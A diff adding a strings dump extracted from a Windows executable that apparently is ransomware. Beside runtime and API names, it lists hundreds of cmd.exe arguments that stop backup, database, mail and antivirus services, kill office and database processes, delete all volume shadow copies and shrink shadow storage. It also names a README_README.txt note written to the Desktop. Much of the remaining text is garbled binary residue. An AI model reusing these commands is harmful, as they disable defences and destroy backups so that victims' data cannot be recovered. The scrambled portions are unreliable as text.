@@ -1,0 +1,782 @@
+!This program cannot be run in DOS mode.
+9RichRA
+`.data
+`.rdata
+@.data
+.gfids
+@.rsrc
+u&h|{A
+URPQQh
+;t$,v-
+UQPXY]Y[
+j"^f91j\^u8
+j"^f9q
+t/j=[f;
+PPPPPWS
+PP9E u:PPVWP
+taj*Xf
+VWj\^j:
+WWWPWS
+SSVWh 
+f9:t!V
+QQSWj0j@
+tl=@vA
+j,h`QA
+PPPPPPPP
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+CorExitProcess
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+GetCurrentPackageId
+LCMapStringEx
+LocaleNameToLCID
+?5Wg4p
+%S#[k=
+"B <1=
+_hypot
+_nextafter
+/C net stop VeeamDeploymentService /y
+/C net stop swi_update /y
+/C net stop MSSQLFDLauncher /y
+/C net stop SDRSVC /y
+/C net stop AcronisAgent /y
+/C net stop swi_filter /y
+/C net stop SstpSvc /y
+/C net stop VeeamDeploySvc /y
+/C taskkill /IM mspub.exe /F
+/C vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
+/C net stop VeeamCatalogSvc /y
+/C net stop VeeamBackupSvc /y
+/C taskkill /IM oomm.exe /F
+/C net stop SQLAgent$TPS /y
+/C net stop svcGenericHost /y
+/C taskkill /IM powerpnt.exe /F
+/C net stop swi_update_64 /y
+/C net stop MSSQL$BKUPEXEC /y
+/C net stop ARSM /y
+/C net stop "Acronis VSS Provider" /y
+/C taskkill /IM mydesktopqos.exe /F
+/C taskkill /IM msftesql.exe /F
+/C taskkill /IM sqlwriter.exe /F
+/C vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
+/C net stop MSSQLServerADHelper100 /y
+/C net stop EPUpdateService /y
+/C net stop BackupExecAgentBrowser /y
+/C net stop VeeamRESTSvc /y
+/C net stop SmcService /y
+/C net stop VeeamCloudSvc /y
+/C net stop SAVService /y
+/C taskkill /IM sqlagent.exe /F
+/C net stop POP3Svc /y
+/C net stop SQLAgent$BKUPEXEC /y
+/C net stop "Zoolz 2 Service" /y
+/C taskkill /IM outlook.exe /F
+/C net stop ntrtscan /y
+/C net stop MySQL80 /y
+/C net stop PDVFSService /y
+/C net stop KAVFS /y
+/C net stop wbengine /y
+/C net stop SQLAgent$VEEAMSQL2008R2 /y
+/C net stop "Sophos Message Router" /y
+/C net stop kavfsslp /y
+/C net stop "Sophos MCS Client" /y
+/C net stop "Sophos MCS Agent" /y
+/C net stop SQLTELEMETRY /y
+/C taskkill /IM steam.exe /F
+/C net stop 
+Veeam Backup Catalog Data Service
+/C net stop masvc /y
+/C net stop MSSQLFDLauncher$SYSTEM_BGC /y
+/C net stop sophossps /y
+/C vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
+/C taskkill /IM mysqld.exe /F
+/C net stop SQLTELEMETRY$ECWDB2 /y
+/C vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
+/C net stop "Sophos Device Control Service" /y
+/C net stop TrueKeyScheduler /y
+/C taskkill /IM dbeng50.exe /F
+/C net stop 
+SQLsafe Filter Service
+/C net stop MSSQL$VEEAMSQL2008R2 /y
+/C net stop VeeamMountSvc /y
+/C net stop "SQL Backups" /y
+/C net stop MSOLAP$TPS /y
+/C net stop SQLBrowser /y
+/C net stop msftesql$PROD /y
+/C net stop MsDtsServer100 /y
+/C net stop FA_Scheduler /y
+/C net stop "Enterprise Client Service" /y
+/C net stop TmCCSF /y
+/C net stop VeeamHvIntegrationSvc /y
+/C net stop McAfeeFramework /y
+/C taskkill /IM wordpad.exe /F
+/C net stop McAfeeFrameworkMcAfeeFramework /y
+/C net stop DCAgent /y
+/C net stop MSSQL$SHAREPOINT /y
+/C net stop Smcinst /y
+/C net stop ReportServer$TPS /y
+/C net stop "Symantec System Recovery" /y
+/C vssadmin Delete Shadows /all /quiet
+/C taskkill /IM oautoupds.exe /F
+/C taskkill /IM msaess.exe /F
+/C net stop MSExchangeMGMT /y
+/C net stop MSSQLFDLauncher$SBSMONITORING /y
+/C net stop MSSQLSERVER /y
+/C net stop MSExchangeIS /y
+/C net stop BackupExecJobEngine /y
+/C net stop 
+Acronis VSS Provider
+/C taskkill /IM thunderbird.exe /F
+/C net stop SQLAgent$PROD /y
+/C taskkill /IM firefoxonfig.exe /F
+/C net stop VeeamEnterpriseManagerSvc /y
+/C net stop SQLSafeOLRService /y
+/C net stop SQLAgent$VEEAMSQL2012 /y
+/C net stop BackupExecVSSProvider /y
+/C net stop VeeamTransportSvc /y
+/C net stop MySQL57 /y
+/C taskkill /IM sqboreservie.exe /F
+/C net stop "Sophos Clean Service" /y
+/C net stop BackupExecManagementService /y
+/C net stop tmlisten /y
+/C vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
+/C net stop SamSs /y
+/C net stop SQLSERVERAGENT /y
+/C net stop "Sophos Web Control Service" /y
+/C net stop SNAC /y
+/C taskkill /IM mbamtray.exe /F
+/C vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
+/C taskkill /IM syntime.exe /F
+/C net stop UI0Detect /y
+/C net stop SQLAgent$TPSAMA /y
+/C net stop MSSQL$PRACTICEMGT /y
+/C net stop MSOLAP$SQL_2008 /y
+/C taskkill /IM ossd.exe /F
+/C taskkill /IM dbsnmp.exe /F
+/C net stop SQLAgent$SBSMONITORING /y
+/C net stop W3Svc /y
+/C net stop "Sophos System Protection Service" /y
+/C net stop EsgShKernel /y
+/C taskkill /IM sqlservr.exe /F
+/C taskkill /IM exel.exe /F
+/C net stop "Veeam Backup Catalog Data Service" /y
+/C net stop MSSQL$SBSMONITORING /y
+/C net stop VeeamNFSSvc /y
+/C net stop MSSQL$PROFXENGAGEMENT /y
+/C net stop MSSQLFDLauncher$SHAREPOINT /y
+/C net stop MSSQL$TPS /y
+/C net stop NetMsmqActivator /y
+/C net stop MSSQL$ECWDB2 /y
+/C net stop SQLAgent$SYSTEM_BGC /y
+/C net stop MSSQL$SYSTEM_BGC /y
+/C vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
+/C taskkill /IM tmlisten.exe /F
+/C net stop RESvc /y
+/C net stop MSSQLFDLauncher$PROFXENGAGEMENT /y
+/C net stop TrueKey /y
+/C net stop "Sophos Agent" /y
+/C taskkill /IM orale.exe /F
+/C net stop MSSQL$VEEAMSQL2012 /y
+/C net stop ReportServer$TPSAMA /y
+/C net stop SQLAgent$ECWDB2 /y
+/C net stop KAVFSGT /y
+/C net stop MSSQLFDLauncher$SQL_2008 /y
+/C net stop MSSQLServerOLAPService /y
+/C net stop MSExchangeMTA /y
+/C net stop MSSQL$SOPHOS /y
+/C net stop IMAP4Svc /y
+/C net stop ReportServer$SQL_2008 /y
+/C taskkill /IM mydesktopservie.exe /F
+/C net stop SQLAgent$PRACTTICEMGT /y
+/C vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
+/C net stop "Sophos AutoUpdate Service" /y
+/C net stop McTaskManager /y
+/C taskkill /IM visio.exe /F
+/C net stop ESHASRV /y
+/C net stop AcrSch2Svc /y
+/C taskkill /IM sqlbrowser.exe /F
+/C vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
+/C net stop MSExchangeES /y
+/C net stop EPSecurityService /y
+/C net stop VeeamBrokerSvc /y
+/C net stop SQLAgent$CXDB /y
+/C net stop mfefire /y
+/C net stop SQLAgent$SQLEXPRESS /y
+/C taskkill /IM infopath.exe /F
+/C net stop SMTPSvc /y
+/C taskkill /IM Ntrtsan.exe /F
+/C net stop MsDtsServer110 /y
+/C net stop SQLAgent$CITRIX_METAFRAME /y
+/C net stop SAVAdminService /y
+/C taskkill /IM onenote.exe /F
+/C net stop BackupExecRPCService /y
+/C net stop SQLAgent$PRACTTICEBGC /y
+/C taskkill /IM PNTMon.exe /F
+/C net stop McShield /y
+/C net stop Antivirus /y
+/C net stop ekrn /y
+/C taskkill /IM thebat64.exe /F
+/C net stop BackupExecAgentAccelerator /y
+/C taskkill /IM mysqld-nt.exe /F
+/C net stop SntpService /y
+/C net stop MSOLAP$SYSTEM_BGC /y
+/C net stop ReportServer /y
+/C net stop MSSQL$TPSAMA /y
+/C net stop SQLWriter /y
+/C net stop mfemms /y
+/C net stop "SQLsafe Backup Service" /y
+/C taskkill /IM mysqld-opt.exe /F
+/C net stop IISAdmin /y
+/C net stop MSExchangeSA /y
+/C taskkill /IM xfssvon.exe /F
+/C vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
+/C taskkill /IM ensv.exe /F
+/C net stop macmnsvc /y
+/C net stop SQLAgent$SHAREPOINT /y
+/C net stop SQLAgent$SOPHOS /y
+/C vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
+/C net stop VSS /y
+/C net stop MsDtsServer /y
+/C taskkill /IM winword.exe /F
+/C net stop MSSQLServerADHelper /y
+/C net stop SQLAgent$SQL_2008 /y
+/C net stop SepMasterService /y
+/C net stop mfevtp /y
+/C vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
+/C net stop swi_service /y
+/C net stop ReportServer$SYSTEM_BGC /y
+/C taskkill /IM tbirdonfig.exe /F
+/C net stop MSSQL$PRACTTICEBGC /y
+/C net stop MSSQL$SQLEXPRESS /y
+/C net stop mozyprobackup /y
+/C net stop TrueKeyServiceHelper /y
+/C net stop "Sophos File Scanner Service" /y
+/C net stop "Sophos Safestore Service" /y
+/C net stop MSOLAP$TPSAMA /y
+/C net stop MSSQL$PROD /y
+/C taskkill /IM zoolz.exe /F
+/C net stop McAfeeEngineService /y
+/C net stop MSSQLFDLauncher$TPS /y
+/C net stop BackupExecDeviceMediaService /y
+/C net stop ShMonitor /y
+/C taskkill /IM thebat.exe /F
+/C net stop MBAMService /y
+/C net stop EhttpSrv /y
+/C net stop SQLAgent$PROFXENGAGEMENT /y
+/C net stop MMS /y
+/C net stop MSSQL$SQL_2008 /y
+/C net stop EraserSvc11710 /y
+/C net stop sacsvr /y
+/C net stop MSSQLFDLauncher$TPSAMA /y
+/C net stop 
+SQLsafe Backup Service
+/C net stop "SQLsafe Filter Service" /y
+/C net stop bedbg /y
+/C net stop WRSVC /y
+/C taskkill /IM isqlplussv.exe /F
+/C net stop MSExchangeSRS /y
+/C net stop OracleClientCache80 /y
+/C net stop "Sophos Health Service" /y
+/C taskkill /IM agntsv.exe /F
+/C net stop 
+Enterprise Client Service
+/C net stop MBEndpointAgent /y
+/C net stop AVP /y
+/C net stop klnagent /y
+/C taskkill /IM NTAoSMgr.exe /F
+.text$mn
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$sxdata
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.gfids$x
+.gfids$y
+.rsrc$01
+.rsrc$02
+FindNextFileW
+WriteFile
+FindClose
+CreateFileW
+GetLastError
+CloseHandle
+CreateThread
+AreFileApisANSI
+GetCPInfoExW
+GetCommConfig
+FoldStringA
+CancelIo
+QueryInformationJobObject
+EraseTape
+VerifyVersionInfoA
+GetSystemTimeAdjustment
+lstrcpynW
+GetPrivateProfileIntW
+GetNumberOfConsoleMouseButtons
+GetModuleFileNameW
+DeleteFiber
+GetCommModemStatus
+CreateConsoleScreenBuffer
+InitializeCriticalSection
+GetCompressedFileSizeW
+GetEnvironmentVariableW
+GetSystemPowerStatus
+EnumCalendarInfoExW
+FindResourceA
+QueryMemoryResourceNotification
+GlobalGetAtomNameW
+DuplicateHandle
+GetModuleHandleA
+GetACP
+PrepareTape
+FindActCtxSectionStringA
+BuildCommDCBAndTimeoutsW
+GetDevicePowerState
+GetLargestConsoleWindowSize
+FatalAppExitA
+GetConsoleDisplayMode
+OutputDebugStringW
+GetCurrentActCtx
+GetMailslotInfo
+WaitForSingleObjectEx
+TlsAlloc
+GetCommState
+OpenSemaphoreW
+AddConsoleAliasA
+HeapAlloc
+WriteConsoleOutputA
+GetLocalTime
+PeekConsoleInputW
+GetCalendarInfoA
+CreateJobObjectA
+GetCurrentProcessId
+EnumTimeFormatsA
+SleepEx
+CreateRemoteThread
+AddAtomW
+GetDiskFreeSpaceExA
+GetProcessHandleCount
+VirtualQuery
+IsWow64Process
+GetExitCodeProcess
+GetModuleHandleW
+KERNEL32.dll
+SwapMouseButton
+CharUpperA
+GetUpdateRect
+FlashWindow
+GetMessageTime
+GetDialogBaseUnits
+IsWindowEnabled
+CreateCursor
+GetDoubleClickTime
+CallMsgFilterW
+CharUpperBuffA
+GetInputState
+GetKeyboardState
+FillRect
+USER32.dll
+CreateDIBPatternBrush
+CombineRgn
+Escape
+EnumObjects
+ResizePalette
+CreatePatternBrush
+GetDeviceCaps
+CreateEllipticRgnIndirect
+GetTextCharacterExtra
+CreateICW
+CreateCompatibleDC
+GDI32.dll
+RegEnumKeyExA
+RegUnLoadKeyW
+RegCreateKeyExA
+RegQueryValueExA
+ADVAPI32.dll
+ShellExecuteA
+SHELL32.dll
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetCurrentProcess
+TerminateProcess
+IsProcessorFeaturePresent
+QueryPerformanceCounter
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+IsDebuggerPresent
+GetStartupInfoW
+RtlUnwind
+SetLastError
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+InitializeCriticalSectionAndSpinCount
+TlsGetValue
+TlsSetValue
+TlsFree
+FreeLibrary
+GetProcAddress
+LoadLibraryExW
+GetStdHandle
+MultiByteToWideChar
+WideCharToMultiByte
+ExitProcess
+GetModuleHandleExW
+HeapFree
+FindFirstFileExW
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetCommandLineW
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+LCMapStringW
+SetStdHandle
+GetFileType
+GetStringTypeW
+GetProcessHeap
+HeapSize
+HeapReAlloc
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+SetFilePointerEx
+WriteConsoleW
+DecodePointer
+RaiseException
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+lkmJ,6'*#E3-3'
+f97B;22<1fmHh`
+98.+S%)8E6<&0~b%R!'F!+1?(: J
+0"J0;.F*,;-!Uj}$ &-*5@B?/!6J
+#4>6<2F8-2%-*lm.-*elSch*
+J#h*<8F
+J&'1= 
+EGeogH
+l#?+)#'#Vh}UOH
+LOHU[NS_VZUXW
+u{nq[ZWYNV[QXJUOx9n-CBZH@_LXIZUZ
+Q>8-.DQT]_TSI[UDv
+Wfl09F_@[
+_A[ZVC2 
+gn/7WUWYYDM
+"#="I
+_CCPH@XLSR4
+@?{.)Y_A@S]_FV\l|t
+LOHU[NS_VZUXW
+u{nq[ZWYNV[QXJUOH
+<.:=B"4H$J
+F7+6'GF-'8=&U
+Jph21l
+&h <>F
+5"J0<9F.78?!0a
+%2%; PX
+el~d!$)<$)
+Bfmeo%
+2"J0<K2$ W+:4ga\LUel[;1.G<*8b
+5"8MIfl
+_(8$d%
+EGQ@X[_V^
+flaozbR
+qnoI2DNO
+qnoI2DNO
+qnoI2DNO
+qnoI2DNO
+qnoI2DNO
+qnoI2DNO
+qnoI2DNO
+@advapi32
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+mscoree.dll
+         (((((                  H
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+@ja-JP
+@api-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+user32
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+README_README.txt
+\DESKTOP
+\Desktop
+ID_HTML
+OMTSCIRVOLU
+AINBAAPLD
+AUACTIDIOSES
+RC_DATA
+&pSidaAemi
+&TiprDECRdSooU
+l&IIOaNmBn
+&lsRNdSdvsIv
+&SInEsnsI
+&IpSsmnniIaa
+&agdCEair
+&ensBaCL
+&aaSmCuSsdET
+&OasLRSorSA
+&pNIRRoUiEU
+&svrITgndp
+&LnEInvIN
+s&edodoCmvU
+r&OlTiaIDsgSD
+&ssSSSeELSspAi
+&oulpvvEgSpTOR
+&CpgOCa
+&TpaRnAsL
+sdevaIRep
+rdADseoT
+SgriTS
+TLlledBnS
+IdiiBU
+TEAmmSIp
+sSEmpSlms
+assASopdsa
+rLIaaAosa
+dUITCpaLsBTv
+nsSImCnCpmna
+DTiCLdnpp
+|&psiRRdRmp
+d&essolinOI
+{&rTlaiaB
+&eTnLdASrsU
+w&eErOmLaUsmN
+&asgpimE
+m&iNORiAa
+&OpiELipmD
+&dTEpDsavmCn
+&aAIpsiaa
+&aCiiATEa
+&DNapsiessDC
+h&EITplpoSooe
+&amRSpSmSAaR
+&adCraRmnE
+&SSRCnvd
+l&TnrROapsiSm
+&sCivddBBvpTS
+nUIerORalSL
+SImapESopoTRdapCaaa
+TAlrRDNEial
+RiNAvR
+sEaisrAsmE
+&plvCui
+&sCSTR
+&dvaeluoSTIC
+&SeRCilaEn
+&snOIvIeLpmglemN
+|&ssSCdLpvA
+&OOLIRs
+&BIRunlgaAidp
+&pCrvRpTR
+&IaLICTe
+&laidoRNA
+&sorrLSCCSrCn
+&NgdolIdai
+&snEeRam
+z&ECLesLBDdgia
+&AmpeSaRulsplE
+&iliapTCI
+&vunDaIassinL
+&eIRelEeRTTIT
+h&TSdspAmI
+&dTgvUoiENsIipR
+e&ugviDiRRiIdvII
+~&LBRllO
+&eSSTOppdsudA
+&IlsTRr
+e&adAAmono
+IOaLpSiIS
+BiIETiiav
+RnisisiinoBBs
+dpsAsaE
+SIsEldR
+indsSO
+saTAoiTvAvlaUsAp
+dAEeaS,CsiSEsUnTBudAi,IBaOleIip
+3uOBEemlsa,vDnLrUT,sdRaISovSs,nsNTgdLaIaipC,ASaIUOia
+mdnNNsv,oaaDlesCCdanam,eSpiElRiERoism,iBipssvRm,elpiLpRrviIRE,opvias,RLTUAIl,ECIpiiBEIvlI,mTSRmAv,eTmDasRSnasi
+KRupsnsiap,AgpgpaIiLDIuI,IaOlBps,aOSAlmRaD,IAIDeA,lappagdEn,NeapTTTC,plErSUv
+;evDvUrrs,saRvpEEC,AimToCouv,asBCoD,lTSLdvanvTuAo,pspmiIAIdv
